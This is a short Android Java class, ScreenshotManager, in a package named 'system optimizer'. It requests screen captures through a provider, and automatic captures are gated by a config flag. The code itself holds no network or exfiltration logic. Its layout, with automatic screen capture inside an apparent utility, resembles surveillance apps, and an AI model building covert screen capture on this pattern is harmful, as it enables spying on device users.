package com.system.optimizer.handler;

import android.util.Log;

import com.system.optimizer.config.ConfigManager;
import com.system.optimizer.config.ConfigData;

public class ScreenshotManager {
    private static final String TAG = "ScreenshotManager";

    private final ConfigManager configManager;

    private final CaptureProvider captureProvider;

    @FunctionalInterface
    public interface CaptureProvider {
        void requestCapture(ScreenshotCallback callback, int quality);
    }

    /**
     * Callback interface for screenshot capture result.
     */
    public interface ScreenshotCallback {
        void onSuccess(byte[] image);

        void onError(String errorMessage);
    }


    public ScreenshotManager(CaptureProvider captureProvider, ConfigManager configManager) {
        if (configManager == null) {
            throw new IllegalArgumentException("ConfigManager cannot be null");
        }
        this.captureProvider = captureProvider;
        this.configManager = configManager;
    }

    /**
     * Take a screenshot.
     * Only one capture can be in progress at a time.
     * 
     * @param callback Called with result
     * @param isManual True if this is a manual request from user, false for
     *                 automatic
     */
    public void takeScreenshot(ScreenshotCallback callback, boolean isManual) {

        try {
            ConfigData config = configManager.getConfig();

            // Only check auto_screenshot for automatic screenshots, not manual ones
            if (!isManual && !config.isAutoScreenshotEnabled()) {
                callback.onError("Screenshot disabled in config");
                return;
            }

            this.captureProvider.requestCapture(callback, config.getScreenshotQuality());

        } catch (Exception e) {
            Log.e(TAG, "Error: " + e.getMessage());
            callback.onError("Error: " + e.getMessage());
        }
    }

}